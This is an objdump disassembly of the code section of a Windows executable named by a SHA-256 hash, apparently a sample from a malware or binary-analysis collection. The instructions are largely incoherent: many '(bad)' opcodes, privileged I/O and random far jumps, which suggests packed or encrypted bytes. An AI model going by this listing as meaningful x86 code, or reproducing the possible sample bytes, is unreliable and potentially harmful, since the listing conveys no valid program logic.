
67fda8a4590402cb777abc8083f0764835b83626390fc9051e98c878aaa265fb.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	(bad)  
  411002:	retf   0xd575
  411005:	mov    al,0x27
  411007:	mov    ch,0x93
  411009:	repz gs pop ecx
  41100c:	rcr    DWORD PTR [edi-0x67],1
  41100f:	xchg   esp,eax
  411010:	dec    edx
  411011:	push   0xa1ef8ef7
  411016:	mov    eax,ds:0x28e2e034
  41101b:	(bad)  
  41101d:	cmp    DWORD PTR [ebp+0x70a36845],0xd
  411024:	xchg   al,dl
  411026:	imul   esp,DWORD PTR [ecx+0x1b],0x230c0e8a
  41102d:	setb   BYTE PTR [edi+0x25a78b54]
  411034:	shl    al,cl
  411036:	loop   0x411008
  411038:	in     eax,0x51
  41103a:	mov    esi,0x24a5ea1e
  41103f:	mov    bl,BYTE PTR [ecx+eiz*8]
  411042:	mov    esi,?
  411044:	pop    ss
  411045:	adc    al,0xcd
  411047:	xchg   esi,eax
  411048:	dec    esp
  411049:	push   edx
  41104a:	sub    eax,0x6447efe
  41104f:	adc    BYTE PTR [edi],dl
  411051:	fstp   DWORD PTR ds:0xc757f528
  411057:	out    0xaf,eax
  411059:	sub    ebp,DWORD PTR gs:[ebx+eiz*8]
  41105d:	sbb    eax,0x9c1a2d43
  411062:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411064:	ret    
  411065:	and    esp,esp
  411067:	(bad)  
  411068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411069:	jmp    0x8763:0x477b4a90
  411070:	xor    ah,BYTE PTR [ecx-0x3c]
  411073:	out    0x21,eax
  411075:	cmp    al,0xbf
  411077:	inc    ebx
  411078:	push   cs
  411079:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41107a:	push   0x2d7afcf3
  41107f:	inc    BYTE PTR [ebp-0x2b]
  411082:	repz dec esi
  411084:	das    
  411085:	pusha  
  411086:	adc    eax,0xdae1d46e
  41108b:	(bad)  
  41108c:	imul   BYTE PTR [edx-0x11681580]
  411092:	adc    DWORD PTR [edx+0x37],edi
  411095:	aaa    
  411096:	call   DWORD PTR [edx+0x71]
  411099:	mov    edx,0x6b897faa
  41109e:	inc    ebx
  41109f:	shl    BYTE PTR [esi+0x442e3bb0],cl
  4110a5:	ins    DWORD PTR es:[edi],dx
  4110a6:	iret   
  4110a7:	mov    ebx,0xf426a3b2
  4110ac:	push   ebx
  4110ad:	or     al,0xf3
  4110af:	push   edi
  4110b0:	jae    0x4110f1
  4110b2:	aaa    
  4110b3:	inc    ebx
  4110b4:	lock loop 0x4110ba
  4110b7:	shr    DWORD PTR [esi+0xe],0xf
  4110bb:	jg     0x41111b
  4110bd:	sbb    esp,DWORD PTR [ebx]
  4110bf:	xchg   ecx,eax
  4110c0:	(bad)  
  4110c1:	nop    DWORD PTR [ebp+0x28]
  4110c5:	and    al,0xad
  4110c7:	push   ecx
  4110c8:	fidiv  DWORD PTR [eax+eax*2]
  4110cb:	addr16 push edi
  4110cd:	pop    eax
  4110ce:	lods   eax,DWORD PTR ds:[esi]
  4110cf:	je     0x4110b7
  4110d1:	(bad)  
  4110d3:	ja     0x411067
  4110d5:	add    BYTE PTR [ecx+0x689e03f4],dh
  4110db:	pop    ecx
  4110dc:	inc    ecx
  4110dd:	mov    al,0x5b
  4110df:	pop    edx
  4110e0:	jns    0x411134
  4110e2:	dec    ecx
  4110e3:	push   ds
  4110e4:	bound  ebp,QWORD PTR [esi+0x7f]
  4110e7:	int3   
  4110e8:	xlat   BYTE PTR ds:[ebx]
  4110e9:	es (bad) 
  4110ec:	fcomp  QWORD PTR [ecx]
  4110ee:	lock mov eax,ds:0x489fbc5b
  4110f4:	fstp   DWORD PTR [ebp+0x65362f27]
  4110fa:	outs   dx,DWORD PTR ds:[esi]
  4110fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110fc:	sbb    eax,DWORD PTR [eax-0x3e]
  4110ff:	pop    edx
  411100:	retf   0x393f
  411103:	aas    
  411104:	loope  0x41109a
  411106:	jl     0x4110a6
  411108:	mov    esp,0x4f7b23f6
  41110d:	addr16 mov bh,0x5c
  411110:	mov    bl,bl
  411112:	jns    0x4110c0
  411114:	cmp    eax,0xa0a8d65f
  411119:	or     cl,BYTE PTR [eax]
  41111b:	ret    0x4723
  41111e:	mov    fs,esi
  411120:	pop    esp
  411121:	retf   
  411122:	mov    ebp,0xcf62a255
  411127:	mov    bl,0x44
  411129:	test   eax,0x4192ef59
  41112e:	shr    BYTE PTR [esi],0x15
  411131:	(bad)  
  411132:	pop    edx
  411133:	push   eax
  411134:	aam    0x85
  411136:	sub    edi,0x5e
  411139:	pusha  
  41113a:	sbb    eax,DWORD PTR cs:[esp+ecx*4]
  41113e:	add    DWORD PTR [ebx+0x4a],esp
  411141:	bound  esp,QWORD PTR [esi-0x21b03cf]
  411147:	repnz inc ebx
  411149:	adc    al,0xb2
  41114b:	outs   dx,BYTE PTR ds:[esi]
  41114c:	sar    DWORD PTR [esi+0xb],0x11
  411150:	pop    ds
  411151:	and    eax,DWORD PTR [ecx]
  411153:	pop    ebx
  411154:	gs loopne 0x4111a3
  411157:	xchg   esp,eax
  411158:	mov    ebx,0xacf5a62d
  41115d:	scas   eax,DWORD PTR es:[edi]
  41115e:	sbb    eax,0xad1296ba
  411163:	mov    BYTE PTR [eax+0x7264296c],al
  411169:	xchg   ebp,eax
  41116a:	repnz out 0x2a,al
  41116d:	lahf   
  41116e:	pop    edi
  41116f:	jmp    0x4111bc
  411171:	push   edi
  411172:	sub    DWORD PTR [esi+0x511bfcf0],edx
  411178:	fild   DWORD PTR [ebx-0x3da333ca]
  41117e:	popf   
  41117f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411180:	daa    
  411181:	addr16 mov ch,0x2f
  411184:	xchg   ebx,eax
  411185:	push   esp
  411186:	fst    QWORD PTR [edx+0x560753be]
  41118c:	and    DWORD PTR [edx],eax
  41118e:	sub    al,0x1d
  411190:	mov    BYTE PTR [edi],bl
  411192:	push   eax
  411193:	std    
  411194:	xchg   BYTE PTR [esi],dl
  411196:	jmp    0x41d2:0xda28d01d
  41119d:	dec    ebx
  41119e:	in     eax,dx
  41119f:	and    BYTE PTR [ecx-0x62d900df],dh
  4111a5:	jge    0x4111d1
  4111a7:	push   eax
  4111a8:	sub    al,0x33
  4111aa:	test   eax,0x71f80756
  4111af:	loopne 0x411197
  4111b1:	lods   al,BYTE PTR ds:[esi]
  4111b2:	test   BYTE PTR [ebp+0x18],cl
  4111b5:	lea    ebx,[edx+0x3db6bad1]
  4111bb:	or     eax,0x6eed99c8
  4111c0:	sub    DWORD PTR [edi-0x50],edi
  4111c3:	rdmsr  
  4111c5:	clc    
  4111c6:	xchg   edx,eax
  4111c7:	sbb    DWORD PTR [ecx],0xffffff87
  4111ca:	(bad)  
  4111cb:	nop
  4111cc:	push   ebx
  4111cd:	scas   al,BYTE PTR es:[edi]
  4111ce:	out    dx,eax
  4111cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111d0:	(bad)  
  4111d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111d2:	imul   ebx,ebp,0xddc9ddd8
  4111d8:	int    0x5a
  4111da:	retf   0x1f48
  4111dd:	popa   
  4111de:	cdq    
  4111df:	inc    eax
  4111e0:	push   ss
  4111e1:	das    
  4111e2:	xlat   BYTE PTR ds:[ebx]
  4111e3:	inc    edx
  4111e4:	xchg   ecx,eax
  4111e5:	and    DWORD PTR [ebx+eax*4],ebx
  4111e8:	add    BYTE PTR [ebx],bh
  4111ea:	adc    BYTE PTR [edi+0x22],0x36
  4111ee:	pop    ss
  4111ef:	or     eax,DWORD PTR ds:0xf9d41672
  4111f5:	jns    0x411257
  4111f7:	sub    DWORD PTR [esi-0x12975033],ebx
  4111fd:	adc    eax,0x42301d68
  411202:	jb     0x4111b8
  411204:	enter  0x6029,0x17
  411208:	pop    es
  411209:	mov    es,eax
  41120b:	sub    eax,0xe81ba6f5
  411210:	aas    
  411211:	adc    al,BYTE PTR [edx+0xe]
  411214:	loop   0x4111e1
  411216:	xor    ah,BYTE PTR [edi-0x74]
  411219:	pop    eax
  41121a:	mov    bh,0xb
  41121c:	pop    ds
  41121d:	push   edi
  41121e:	int3   
  41121f:	leave  
  411220:	inc    ecx
  411221:	ror    esp,0x4e
  411224:	aas    
  411225:	jne    0x4111ac
  411227:	icebp  
  411228:	mov    ebx,0xdf6f1013
  41122d:	or     dl,0x77
  411230:	bt     DWORD PTR [ebx],edx
  411233:	into   
  411234:	in     al,0xa3
  411236:	push   esp
  411237:	(bad)  cs:[ebp+0x54b45135]
  41123e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41123f:	or     DWORD PTR [edi+ebx*8-0x41a8721f],edi
  411246:	rcl    BYTE PTR [edi+0xd],1
  411249:	add    BYTE PTR [ecx+0x4],cl
  41124c:	mov    esp,0x1ed378c6
  411251:	fsub   st(1),st
  411253:	popa   
  411254:	mov    ch,0xe9
  411256:	or     BYTE PTR [ecx-0x12],bh
  411259:	sbb    eax,0xb744cfa4
  41125e:	(bad)  
  41125f:	dec    ebp
  411260:	rol    edi,cl
  411262:	jae    0x4111f4
  411264:	mov    al,0x8c
  411267:	lea    esp,ds:0x8c9341cd
  41126d:	push   ds
  41126e:	int3   
  41126f:	xchg   ecx,eax
  411270:	mov    ds:0x88200c4b,al
  411275:	ror    DWORD PTR [edi+ebp*1+0x67ed8cf7],1
  41127c:	jo     0x4112e2
  41127e:	in     al,dx
  41127f:	icebp  
  411280:	stos   BYTE PTR es:[edi],al
  411281:	lock pushf 
  411283:	sub    eax,0x96a43ca0
  411288:	cli    
  411289:	fidiv  DWORD PTR [ecx+eax*8+0x3fcc3109]
  411290:	(bad)  
  411291:	adc    eax,0x58ca704f
  411296:	dec    ebp
  411297:	in     eax,0x5b
  411299:	pushf  
  41129a:	js     0x41123f
  41129c:	cmp    DWORD PTR [edx],edi
  41129e:	jmp    0x411288
  4112a0:	add    ebp,DWORD PTR [ecx-0x48e22f78]
  4112a6:	je     0x4112fb
  4112a8:	xor    al,BYTE PTR [esi-0x72]
  4112ab:	hlt    
  4112ac:	dec    ebp
  4112ad:	cmp    ebx,ebp
  4112af:	pop    ss
  4112b0:	nop
  4112b1:	std    
  4112b2:	mov    ebp,DWORD PTR [edi+0x739f75ab]
  4112b8:	add    BYTE PTR [edx-0x2d],0x52
  4112bc:	scas   al,BYTE PTR es:[edi]
  4112bd:	jnp    0x41129d
  4112bf:	dec    esp
  4112c0:	loopne 0x4112f8
  4112c2:	push   esp
  4112c3:	inc    ebx
  4112c4:	icebp  
  4112c5:	test   BYTE PTR [esi+0x3830f49b],cl
  4112cb:	jmp    0xa83b6663
  4112d0:	retf   
  4112d1:	or     al,0x47
  4112d3:	outs   dx,DWORD PTR ds:[esi]
  4112d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112d6:	int3   
  4112d7:	sub    BYTE PTR [ebx+eiz*4],cl
  4112da:	fisub  WORD PTR [esi+0x300cf9c]
  4112e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112e1:	push   esp
  4112e2:	xor    eax,0xf3dbbe86
  4112e7:	retf   
  4112e8:	cwde   
  4112e9:	in     eax,0x49
  4112eb:	cli    
  4112ec:	out    0xe5,eax
  4112ee:	pop    esi
  4112ef:	aam    0x6f
  4112f1:	inc    edx
  4112f2:	leave  
  4112f3:	dec    eax
  4112f4:	(bad)  
  4112f5:	in     eax,0xbb
  4112f7:	pop    edi
  4112f8:	push   esi
  4112f9:	les    ebx,FWORD PTR [eax+0x5e]
  4112fc:	outs   dx,DWORD PTR ds:[esi]
  4112fd:	sub    eax,0x102ab148
  411302:	mov    ch,ch
  411304:	cli    
  411305:	and    esp,DWORD PTR [eax-0x2a]
  411308:	ret    0x87a3
  41130b:	rol    esp,1
  41130d:	clc    
  41130e:	les    eax,FWORD PTR [edi]
  411310:	mov    ecx,0xd975e71a
  411315:	mov    ch,0xf4
  411317:	int    0xed
  411319:	nop
  41131a:	xchg   edx,eax
  41131b:	imul   esi,DWORD PTR [ebx],0xd44e98c0
  411321:	dec    esp
  411322:	fisttp WORD PTR [ecx+0x41]
  411325:	loop   0x411304
  411327:	push   ecx
  411328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411329:	mov    al,ds:0x2f3923cd
  41132e:	mov    ebx,0x1c6531eb
  411333:	jl     0x41139b
  411335:	add    edi,ecx
  411337:	ss pop ds
  411339:	push   es
  41133a:	pop    ebx
  41133b:	xor    DWORD PTR ds:0x473a8d8b,0xfffffffa
  411342:	or     al,0x3
  411344:	pop    ebp
  411345:	mov    al,BYTE PTR [ebx+0x53c80d22]
  41134b:	mov    bl,0xd1
  41134d:	xor    DWORD PTR [ecx],edi
  41134f:	push   ebp
  411350:	aad    0x4a
  411352:	cmp    ah,bh
  411354:	and    cl,bh
  411356:	inc    eax
  411357:	sub    eax,0xa309c381
  41135c:	dec    edi
  41135d:	mov    ah,0xbc
  41135f:	push   esi
  411360:	push   ebx
  411361:	mov    ch,0x5c
  411363:	cmp    DWORD PTR gs:[esi-0x7a],0x4e04ab34
  41136b:	and    BYTE PTR [ebp+0x5e10d8ed],al
  411371:	mov    ebp,0xe7eca3c6
  411376:	into   
  411377:	adc    edx,ecx
  411379:	jbe    0x4113e2
  41137b:	clc    
  41137c:	cli    
  41137d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41137e:	xchg   ebx,eax
  41137f:	inc    eax
  411380:	jnp    0x41136e
  411382:	es push esp
  411384:	cld    
  411385:	(bad)  
  411386:	fwait
  411387:	jo     0x4113d1
  411389:	push   edx
  41138a:	adc    ch,BYTE PTR [edx-0x4caabb0c]
  411390:	loop   0x4113c1
  411392:	xor    al,0x95
  411394:	mul    DWORD PTR [eax-0x58]
  411397:	aam    0x61
  411399:	call   0xee759e1d
  41139e:	jne    0x41138b
  4113a0:	jle    0x4113ee
  4113a2:	jg     0x4113ac
  4113a4:	sbb    dl,ch
  4113a6:	hlt    
  4113a7:	mov    DWORD PTR [ecx-0xc09eac2],ebx
  4113ad:	inc    eax
  4113ae:	scas   al,BYTE PTR es:[edi]
  4113af:	mov    bh,0xd7
  4113b1:	in     al,dx
  4113b2:	mov    esi,0x2b5559c0
  4113b7:	pop    ebp
  4113b8:	push   edi
  4113b9:	arpl   WORD PTR [ebx],bp
  4113bb:	(bad)  
  4113bc:	in     al,dx
  4113bd:	jle    0x4113cb
  4113bf:	mov    ecx,0xdf54c779
  4113c4:	push   ecx
  4113c6:	inc    esp
  4113c7:	sub    ah,BYTE PTR [eax+0x65]
  4113ca:	mov    ds:0x2733bab2,eax
  4113cf:	jnp    0x4113a0
  4113d1:	shl    DWORD PTR [ebx-0x2f],0x4e
  4113d5:	addr16 jbe 0x4113e1
  4113d8:	pusha  
  4113d9:	pop    edx
  4113da:	mov    esi,0xf8a7bfd8
  4113df:	and    eax,0xc4a190d0
  4113e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113e5:	(bad)  
  4113e6:	mov    eax,ds:0xcb97388d
  4113eb:	or     edi,DWORD PTR [ebx]
  4113ed:	ja     0x411398
  4113ef:	neg    bh
  4113f1:	mov    edi,0xe5a07fe0
  4113f6:	inc    esi
  4113f7:	push   cs
  4113f8:	jns    0x4113aa
  4113fa:	jne    0x4113af
  4113fc:	sbb    BYTE PTR [eax-0x191c367b],bh
  411402:	daa    
  411403:	dec    edi
  411404:	adc    DWORD PTR [esi+0x70],esp
  411407:	ja     0x411404
  411409:	test   DWORD PTR [edi+0x7c],ebx
  41140c:	sbb    eax,0xf2aa1fbf
  411411:	in     al,0x27
  411413:	mov    ah,0xea
  411415:	jnp    0x411462
  411417:	and    esp,DWORD PTR [eax-0x6fd171e4]
  41141d:	mov    bh,0xc9
  41141f:	pop    ebp
  411420:	pop    ds
  411421:	mov    al,ds:0x8ee6c7db
  411426:	and    ch,bh
  411428:	xor    edi,DWORD PTR [esi-0x31]
  41142b:	add    DWORD PTR [ebp-0x80],esi
  41142e:	popa   
  41142f:	xchg   edi,eax
  411430:	fld    QWORD PTR [eax-0x70]
  411433:	mov    al,0x93
  411435:	out    0x2b,eax
  411437:	div    BYTE PTR [eax]
  411439:	jle    0x4114b0
  41143b:	cmp    esi,edx
  41143d:	out    0x76,al
  41143f:	jne    0x4113c5
  411441:	sub    esp,DWORD PTR [esi]
  411443:	imul   edx,DWORD PTR [ebp+0x29b920cb],0xffffffce
  41144a:	mov    edi,0x1cf37c76
  41144f:	and    esp,DWORD PTR [edi+0x52]
  411452:	adc    eax,0x6fdb6c0e
  411457:	mov    ebp,DWORD PTR [bx+di-0xf]
  41145b:	inc    esp
  41145c:	(bad)  
  41145d:	test   eax,0xc1eac97e
  411462:	fs (bad) 
  411465:	xchg   ebx,eax
  411466:	mov    ah,0x19
  411468:	or     al,0x67
  41146a:	inc    edx
  41146b:	push   ebp
  41146c:	addr16 jnp 0x41141a
  41146f:	rcl    BYTE PTR [eax+ebx*1-0x29],1
  411473:	test   BYTE PTR [ebx-0x76],0x41
  411477:	adc    eax,0xe856991a
  41147c:	xor    dh,0xfa
  41147f:	pop    edi
  411480:	jne    0x411483
  411482:	fmul   DWORD PTR [ecx-0x2b]
  411485:	pop    ebp
  411486:	cmp    eax,DWORD PTR [ecx-0x4f]
  411489:	adc    dh,BYTE PTR [ebx-0x37a290fb]
  41148f:	cmp    ch,BYTE PTR [edi]
  411491:	pop    ds
  411492:	(bad)  
  411493:	push   edx
  411494:	shr    edi,1
  411496:	je     0x411420
  411498:	inc    ebx
  411499:	jge    0x411448
  41149b:	fcomp  QWORD PTR [ebx]
  41149d:	dec    eax
  41149e:	sahf   
  41149f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114a0:	add    eax,0x1239cc01
  4114a5:	mov    bh,0x8f
  4114a7:	push   0x68
  4114a9:	cmp    ch,BYTE PTR [ecx-0x11f7f279]
  4114af:	imul   edx,DWORD PTR [ebx-0x4],0xf177b43f
  4114b6:	js     0x411465
  4114b8:	jmp    0x1d012e11
  4114bd:	jns    0x411444
  4114bf:	xchg   ebp,eax
  4114c0:	in     al,dx
  4114c1:	add    DWORD PTR [esi-0x2d52a40c],0x7be9e31c
  4114cb:	push   esi
  4114cc:	dec    ebx
  4114cd:	jg     0x4114e1
  4114cf:	mov    ecx,DWORD PTR fs:[ebx+edx*1-0x75]
  4114d4:	sbb    al,0xcf
  4114d6:	push   edx
  4114d7:	inc    edx
  4114d8:	add    eax,0x29d8f608
  4114dd:	test   al,0x37
  4114df:	push   es
  4114e0:	(bad)  
  4114e1:	fldcw  WORD PTR [esi]
  4114e3:	jbe    0x411553
  4114e5:	cdq    
  4114e6:	pop    ss
  4114e7:	adc    ch,cl
  4114e9:	test   al,0x4e
  4114eb:	(bad)
  4114ef:	add    al,cl
  4114f1:	scas   al,BYTE PTR es:[edi]
  4114f2:	sahf   
  4114f3:	xlat   BYTE PTR ds:[ebx]
  4114f4:	mov    dl,0x11
  4114f6:	call   0xb99e210b
  4114fb:	or     BYTE PTR [ecx-0x4f],dh
  4114fe:	inc    ecx
  4114ff:	stos   BYTE PTR es:[edi],al
  411500:	push   ss
  411501:	popf   
  411502:	jno    0x411533
  411504:	jno    0x4114fa
  411506:	out    dx,eax
  411507:	aam    0x33
  411509:	(bad)  
  41150a:	cmp    eax,0x2d02ce19
  41150f:	mov    ebp,0x9b2c574b
  411514:	(bad)  
  411515:	hlt    
  411516:	ins    DWORD PTR es:[edi],dx
  411517:	(bad)  
  411518:	cld    
  411519:	(bad)  
  41151a:	mov    cl,0xa7
  41151c:	pop    es
  41151d:	loop   0x411545
  41151f:	mov    ah,0xbf
  411521:	jnp    0x411554
  411523:	mov    ebx,0x97c98440
  411528:	adc    ah,al
  41152a:	sub    bl,cl
  41152c:	adc    DWORD PTR [edx],edx
  41152e:	gs adc DWORD PTR es:[ecx-0x67419a4e],ecx
  411536:	cdq    
  411537:	inc    ecx
  411538:	inc    esi
  411539:	add    cl,BYTE PTR [edi+0x69]
  41153c:	das    
  41153d:	fild   WORD PTR [edx+eiz*4]
  411540:	xor    DWORD PTR ds:[ebx-0x17],eax
  411544:	(bad)  
  411545:	fild   QWORD PTR [esi]
  411547:	jns    0x4114e8
  411549:	dec    ebx
  41154a:	sbb    eax,0x2eaaf7ba
  41154f:	cmp    eax,0xcbe07186
  411554:	add    DWORD PTR [edx-0x72fff5f3],edi
  41155a:	xor    al,0x5e
  41155c:	dec    edi
  41155d:	adc    ch,BYTE PTR [esi]
  41155f:	or     eax,DWORD PTR ds:0x71be75b1
  411565:	xor    al,0x25
  411567:	out    0x16,eax
  411569:	fsub   st,st(3)
  41156b:	adc    eax,DWORD PTR [esi+0x1d6db759]
  411571:	fsubr  QWORD PTR [esi+ecx*4]
  411574:	and    ebx,esi
  411576:	lds    esi,FWORD PTR [edx]
  411578:	das    
  411579:	jbe    0x4115ca
  41157b:	aaa    
  41157c:	cs mov esi,0x53faaa4d
  411582:	out    0x47,eax
  411584:	loopne 0x4115ee
  411586:	adc    dx,WORD PTR [esp+ebx*2]
  41158a:	inc    edx
  41158b:	lahf   
  41158c:	xor    eax,0xcf18fe93
  411591:	int3   
  411592:	jmp    0xb1a4:0xcc288ab1
  411599:	adc    DWORD PTR [edx-0x1dfa7292],0x69781df6
  4115a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115a4:	push   ds
  4115a5:	or     edx,edx
  4115a7:	mov    WORD PTR [ebp-0x606b1b52],gs
  4115ad:	mov    dl,0x5b
  4115af:	pop    ecx
  4115b0:	jb     0x4115c0
  4115b2:	aad    0x51
  4115b4:	loopne 0x4115d8
  4115b6:	dec    esp
  4115b7:	xchg   ebp,eax
  4115b8:	fldcw  WORD PTR [eax+0x3e4dc7e8]
  4115be:	mov    ds:0x8da2f7f1,eax
  4115c3:	call   0x4477:0x539fdce2
  4115ca:	retf   0xdd02
  4115cd:	pop    ds
  4115ce:	jo     0x4115d6
  4115d0:	popa   
  4115d1:	call   0x47a9:0xb16c9024
  4115d8:	aas    
  4115d9:	dec    edi
  4115da:	jne    0x4115ab
  4115dc:	sbb    esi,esp
  4115de:	lahf   
  4115df:	push   edx
  4115e0:	cwde   
  4115e1:	popf   
  4115e2:	jge    0x411644
  4115e4:	pop    edi
  4115e5:	adc    al,0xcf
  4115e7:	xchg   ecx,eax
  4115e8:	add    DWORD PTR [ebx],ecx
  4115ea:	rcl    DWORD PTR [eax+ebp*4-0x67],0x69
  4115ef:	add    edi,DWORD PTR [edx+0x1e3406e0]
  4115f5:	xchg   BYTE PTR [edi+0x24],dl
  4115f8:	dec    dh
  4115fa:	pop    esi
  4115fb:	retf   
  4115fc:	mov    ss,WORD PTR [esp+ecx*4+0x43]
  411600:	fcom   DWORD PTR [edx-0x70]
  411603:	jbe    0x41164a
  411605:	pop    ecx
  411606:	mov    esi,DWORD PTR [esi-0x33]
  411609:	pop    es
  41160a:	fwait
  41160b:	ret    0xda3b
  41160e:	mov    bh,0x3b
  411610:	mov    bl,0x86
  411612:	pop    ds
  411613:	inc    ecx
  411614:	leave  
  411615:	outs   dx,DWORD PTR ds:[esi]
  411617:	sti    
  411618:	rcr    BYTE PTR [ecx+0x807b216],1
  41161e:	mov    edi,0x388fa964
  411623:	add    eax,DWORD PTR [ecx]
  411625:	mov    ds:0x6ca6804a,eax
  41162a:	add    al,BYTE PTR [edx-0x35]
  41162d:	in     eax,0x5d
  41162f:	xchg   esp,eax
  411630:	mov    ebp,0x7d0deb6a
  411635:	aad    0x84
  411637:	(bad)  
  411638:	pop    edi
  411639:	out    dx,eax
  41163a:	pusha  
  41163b:	into   
  41163c:	call   0x1acb:0x299a0bf2
  411643:	test   BYTE PTR [edi+0x6f609ccb],al
  411649:	add    al,0x35
  41164b:	not    esi
  41164d:	aaa    
  41164e:	mov    ah,0xb2
  411650:	out    dx,al
  411651:	xchg   DWORD PTR [edi-0x4f],edx
  411654:	jae    0x4115e2
  411656:	fs loopne 0x41165e
  411659:	aad    0x9
  41165b:	sbb    al,0x34
  41165d:	and    bh,dl
  41165f:	jmp    0xe175f7c7
  411664:	in     eax,dx
  411665:	mov    al,0xc3
  411667:	in     eax,0x3e
  411669:	pushf  
  41166a:	cld    
  41166b:	shr    BYTE PTR [edx+edx*2-0x1f],cl
  41166f:	not    DWORD PTR [eax]
  411671:	sub    bl,BYTE PTR [edi]
  411673:	or     DWORD PTR [esi],edi
  411675:	fwait
  411676:	jmp    0xca7ce007
  41167b:	inc    edx
  41167c:	fsub   QWORD PTR [ecx]
  41167e:	xchg   esi,eax
  411680:	js     0x4116fe
  411682:	shr    DWORD PTR [edi+eiz*1],cl
  411685:	mov    al,0x6d
  411687:	mov    cl,0xe4
  411689:	cmp    al,0xc5
  41168b:	fisttp QWORD PTR [edi]
  41168d:	es in  eax,0x41
  411690:	jp     0x411625
  411692:	addr16 (bad) 
  411695:	push   eax
  411696:	inc    edx
  411697:	out    0xe7,al
  411699:	fs pusha 
  41169b:	sbb    edi,edx
  41169d:	retf   0x36c5
  4116a0:	or     ebx,ecx
  4116a2:	inc    edi
  4116a3:	cwde   
  4116a4:	pop    es
  4116a5:	in     al,0xc2
  4116a7:	jnp    0x41170a
  4116a9:	push   ebp
  4116aa:	mov    ebp,0xeecdb91
  4116af:	lds    esp,FWORD PTR [edx-0x191469e1]
  4116b5:	push   esp
  4116b6:	xchg   ebx,eax
  4116b7:	int3   
  4116b8:	mov    edi,0xa9fd94f7
  4116bd:	mov    ah,0x8b
  4116bf:	xchg   esi,eax
  4116c0:	imul   esi,DWORD PTR [edx],0xf
  4116c3:	jno    0x41164e
  4116c5:	jle    0x4116ce
  4116c7:	pop    eax
  4116c8:	sbb    BYTE PTR [edx+edi*4],dl
  4116cb:	inc    edi
  4116cc:	fnstsw WORD PTR [ecx-0x7c]
  4116cf:	jl     0x4116bb
  4116d1:	dec    eax
  4116d2:	mov    cl,0x48
  4116d4:	jnp    0x411685
  4116d6:	std    
  4116d7:	fwait
  4116d8:	push   esp
  4116d9:	test   al,0xd8
  4116db:	test   BYTE PTR [ebp-0x71],0x19
  4116df:	sub    eax,0x3c998b31
  4116e4:	jp     0x4116c6
  4116e6:	mov    bh,0xc8
  4116e8:	or     ebx,DWORD PTR es:[edi+0x4a69cefc]
  4116ef:	dec    ebx
  4116f0:	clc    
  4116f1:	imul   eax,eax,0xffffffc1
  4116f4:	mov    edx,0x8d97296a
  4116f9:	push   ebx
  4116fa:	and    al,0x8e
  4116fc:	adc    DWORD PTR [ebx+0x74],ebp
  4116ff:	(bad)  
  411700:	aam    0xcc
  411702:	out    dx,al
  411703:	mov    ebp,0x76b40c2b
  411708:	mov    ecx,0xce13cd9c
  41170d:	stos   BYTE PTR es:[edi],al
  41170e:	lods   eax,DWORD PTR ds:[esi]
  41170f:	push   ebp
  411710:	xchg   BYTE PTR [edi-0x77],bl
  411713:	mov    ds:0x16553aef,al
  411718:	ins    DWORD PTR es:[edi],dx
  411719:	sti    
  41171a:	pusha  
  41171b:	cmp    BYTE PTR [edi-0x79999094],ah
  411721:	xchg   esp,eax
  411722:	loop   0x41178d
  411724:	les    esi,FWORD PTR [bp+si+0x551b]
  411729:	call   0xf471:0xeb90d02f
  411730:	inc    esp
  411731:	scas   eax,DWORD PTR es:[edi]
  411732:	lahf   
  411733:	cmp    al,0x8c
  411735:	ins    BYTE PTR es:[edi],dx
  411736:	lods   eax,DWORD PTR ds:[esi]
  411737:	cmp    BYTE PTR [edx+eax*8-0x23ffe6b4],al
  41173e:	xor    dl,al
  411740:	not    DWORD PTR [ecx+0x458afe70]
  411746:	mov    edx,0x85e1f31a
  41174b:	pop    esi
  41174c:	xor    edx,DWORD PTR [ebp+0x38]
  41174f:	sub    BYTE PTR [ecx],0x35
  411752:	stc    
  411753:	cwde   
  411754:	jae    0x4117a5
  411756:	ds push es
  411758:	jnp    0x411717
  41175a:	adc    eax,0x73c7c744
  41175f:	int    0xa3
  411761:	jl     0x4117d4
  411763:	mov    bl,0xe3
  411765:	mov    gs,WORD PTR [ebp-0x3e]
  411768:	mov    ch,0x52
  41176a:	inc    ebp
  41176b:	out    0xe4,eax
  41176d:	daa    
  41176e:	lds    esp,FWORD PTR [esi]
  411770:	in     al,dx
  411771:	ret    
  411772:	sub    BYTE PTR [edi-0x14],bl
  411775:	(bad)  
  411776:	ss aas 
  411778:	inc    ebp
  411779:	psllq  mm0,QWORD PTR [esi-0x62]
  41177d:	jg     0x4117b7
  41177f:	data16 lods al,BYTE PTR ds:[esi]
  411781:	data16 adc dh,BYTE PTR [esi-0x6f8c9c6a]
  411788:	and    BYTE PTR [ebp-0x2e],ch
  41178b:	xchg   ecx,eax
  41178c:	ficom  WORD PTR [edx]
  41178e:	add    eax,0x4efea100
  411793:	rol    DWORD PTR [edi],1
  411795:	adc    al,0x33
  411797:	sbb    al,0xe3
  411799:	out    0xa8,eax
  41179b:	push   eax
  41179c:	test   eax,0x8dbc126d
  4117a1:	fimul  WORD PTR [edi+edi*2]
  4117a4:	rol    esp,0xef
  4117a7:	icebp  
  4117a8:	jo     0x41176f
  4117aa:	dec    esp
  4117ab:	add    DWORD PTR ds:0x7ef732e8,edi
  4117b1:	add    al,0xf9
  4117b3:	or     bh,ah
  4117b5:	das    
  4117b6:	fwait
  4117b7:	enter  0x5766,0x8a
  4117bb:	mov    ebx,ds
  4117bd:	pop    ebp
  4117be:	retf   
  4117bf:	jge    0x4117ff
